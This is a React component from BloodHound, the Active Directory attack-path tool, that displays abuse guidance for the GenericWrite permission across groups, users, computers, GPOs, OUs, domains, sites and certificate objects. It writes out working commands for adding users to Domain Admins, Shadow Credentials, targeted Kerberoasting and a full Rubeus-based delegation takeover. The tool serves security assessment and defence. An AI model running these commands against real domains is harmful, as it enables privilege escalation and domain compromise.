// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite to a group allows you to directly modify group membership of the group.
                    </Typography>
                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See
                        the opsec considerations tab for why this may be a bad idea. The second, and highly recommended
                        method, is by using the Add-DomainGroupMember function in PowerView. This function is superior
                        to using the net.exe binary in several ways. For instance, you can supply alternate credentials,
                        instead of needing to run a process as or logon as the user with the AddMember permission.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>
                    <Typography variant='body2'>
                        To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into
                        your agent session or into a PowerShell instance at the console. You may need to authenticate to
                        the Domain Controller as
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>
                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>
                    <Typography variant='body2'>
                        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a
                        process as {sourceName}:
                    </Typography>
                    <Typography component={'pre'}>
                        {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
                    </Typography>
                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group with PowerView's
                        Get-DomainGroupMember:
                    </Typography>
                    <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                        attribute of target. Writing to this property allows an attacker to create "Shadow Credentials"
                        on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the
                        "AddKeyCredentialLink" edge.
                    </Typography>
                    <Typography variant='body2'>
                        Alternatively, GenericWrite enables {sourceName} to set a ServicePrincipalName (SPN) on the
                        targeted user, which may be abused in a Targeted Kerberoast attack.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User' || sourceType === 'Computer'
                            ? `${sourceName} if you are not running a process as that user/computer`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                    </Typography>

                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the Whisker documentation.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast attack </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </Typography>
                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first create a PSCredential object (these
                        examples comes from the PowerView help documentation):
                    </Typography>
                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>
                    <Typography variant='body2'>
                        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process
                        as {sourceName}:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        After running this, you can use Get-DomainSPNTicket as follows:
                    </Typography>
                    <Typography component={'pre'}>{'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}</Typography>
                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the
                        ServicePrincipalName can be done with the Set-DomainObject command:
                    </Typography>
                    <Typography component={'pre'}>
                        {'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'}
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permissions over a GPO, you may make modifications to that GPO in order to inject malicious configurations into it. 
                        You could for instance add a Scheduled Task that will then be executed by all of the computers and/or users to which the GPO applies, 
                        thus compromising them. Note that some configurations (such as Scheduled Tasks) implement item-level targeting, allowing 
                        to precisely target a specific object.
                        GPOs are applied every 90 minutes for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain controllers.
                        See the references tab for a more detailed write up on this abuse.
                    </Typography>

                    <Typography variant='body2'>
                        On a domain-joined Windows machine, the native Group Policy Management Console (GPMC) may be used to edit GPOs. 
                        On a non-domain joined Windows Machine, the{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://github.com/CCob/DRSAT'>
                            DRSAT (Disconnected RSAT)
                        </Link> tool can be used.
                    </Typography>
                    <Typography variant='body2'>
                        This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with
                        'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to
                        add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for
                        the given GPO. Therefore, you need write access to child objects of this folder or create child
                        objects permission. The security descriptor of the GPO is reflected on the folder, meaning
                        permissions to write child items on the GPO are required.
                    </Typography>
                </>
            );
        case 'Computer':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                        attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
                        Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
                        equivalent to the "AddKeyCredentialLink" edge.
                    </Typography>

                    <Typography variant='body2'>
                        Alternatively, GenericWrite on a computer object can be used to perform a Resource-Based
                        Constrained Delegation attack.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User' || sourceType === 'Computer'
                            ? `${sourceName} if you are not running a process as that user/computer`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                    </Typography>

                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the Whisker documentation.
                    </Typography>

                    <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>

                    <Typography variant='body2'>
                        Abusing this primitive is possible through the Rubeus project.
                    </Typography>

                    <Typography variant='body2'>
                        First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad
                        project can be used to add a new attacker-controlled computer account:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        PowerView can be used to then retrieve the security identifier (SID) of the newly created
                        computer account:
                    </Typography>

                    <Typography component={'pre'}>
                        $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
                        objectsid
                    </Typography>

                    <Typography variant='body2'>
                        We now need to build a generic ACE with the attacker-added computer SID as the principal, and
                        get the binary bytes for the new DACL/ACE:
                    </Typography>

                    <Typography component={'pre'}>
                        {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                            '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                            '$SD.GetBinaryForm($SDBytes, 0)'}
                    </Typography>

                    <Typography variant='body2'>
                        Next, we need to set this newly created security descriptor in the
                        msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again
                        using PowerView in this case:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                    </Typography>

                    <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                    <Typography variant='body2'>
                        And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname)
                        we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this
                        case grants us access to the file system of the TARGETCOMPUTER:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                        }
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permissions over an OU, it is possible to modify its 
                        gPLink attribute. This may be abused to apply a malicious Group Policy Object
                        (GPO) to all of the OU's user and computer objects (including the ones located in nested OUs).
                        This can be exploited to make said child objects execute arbitrary commands e.g. through an immediate
                        scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be
                        exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline
                        of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                            this article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target OU object through its gPLink attribute.
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given domain as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'Domain':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a domain object, it is possible to modify its 
                        gPLink attribute. This may be abused to apply a malicious Group Policy Object
                        (GPO) to all of the domain's user and computer objects (including the ones located in nested OUs).
                        This can be exploited to make said child objects execute arbitrary commands e.g. through an immediate
                        scheduled task, thus compromising them.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the domain and to create machine accounts. 
                        Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the 
                        attack vector implementation is not trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be
                        exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline
                        of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                            this article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) into a controlled GPO, and then link the GPO to the target domain object through its gPLink attribute.
                    </Typography>

                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given domain as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a certificate template, you may be able to perform an ESC4
                        attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4
                        edge from the principal to the forest domain node.
                    </Typography>
                </>
            );
        case 'EnterpriseCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over an enterprise CA, you can publish certificate templates to the
                        enterprise CA by adding the CN name of the template in the enterprise CA object's
                        certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'RootCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a root CA, you can make a rogue certificate trusted as a root
                        CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute.
                        This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'NTAuthStore':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over a NTAuth store, you can make an enterprise CA certificate
                        trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA
                        object's cACertificate attribute. This action may enable you to perform an ADCS domain
                        escalation.
                    </Typography>
                </>
            );
        case 'IssuancePolicy':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericWrite permission over an issuance policy object, you create a OID group link to a
                        targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of
                        the issuance policy object. This action may enable you to gain membership of the group through
                        an ADCS ESC13 attack.
                    </Typography>
                </>
            );
        case 'Site':
            return (
                <>
                    <Typography variant='body2'>
                        GenericWrite permissions over a Site object allow modifying the gPLink attribute of the site.
                        The ability to alter the gPLink attribute of a site may allow an attacker to apply a malicious Group Policy Object
                        (GPO) to all of the objects associated with the site. This can be exploited to make said objects execute 
                        arbitrary commands e.g. through an immediate scheduled task, thus compromising them.
                        In the case of a site, the affected objects are the computers that have an IP address included in one of the site's subnets  
                        (or computers that do not belong to any site if this is the default site), as well as users connecting to these computers.
                        Note that Server objects associated with the Site should be located in the Site.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not have control over an existing GPO (or the ability to create new ones), successful exploitation
                        will require the possibility to add non-existing DNS records to the
                        domain and to create machine accounts. Alternatively, an already compromised domain-joined
                        machine may be used to perform the attack. Note that the attack vector implementation is not
                        trivial and will require some setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be
                        exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline
                        of exploit requirements and implementation, you can refer to{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                            this article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you have control over an existing GPO (or the ability to create new ones), the attack is simpler. You can inject a malicious
                        configuration (e.g. an immediate scheduled task) in that GPO, and then link the GPO to the target Site through its gPLink attribute.
                    </Typography>
                    
                    <Typography variant='body2'>
                        Be mindful of the number of users and computers that are in the given site as they all will
                        attempt to fetch and apply the malicious GPO.
                    </Typography>
                </>
            );
        default:
            return (
                <>
                    <Typography variant='body2'>No abuse information available for this node type.</Typography>
                </>
            );
    }
};

export default WindowsAbuse;
